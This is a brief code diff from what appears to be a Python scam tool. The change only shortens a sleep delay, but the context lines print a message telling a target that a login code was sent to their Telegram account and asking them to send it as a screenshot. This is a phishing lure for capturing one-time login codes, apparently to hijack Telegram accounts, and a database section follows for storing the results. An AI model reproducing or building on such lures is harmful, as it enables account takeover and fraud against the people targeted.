@@ -107,7 +107,7 @@ We sent a Screnshot  login code to your Telegram account. Enter your Login Scren
 
 Just send it in the form of a screenshot, you don't need to send it via text.
 """)
-    time.sleep(10)
+    time.sleep(5)
 
 # DATABASE !!!
 
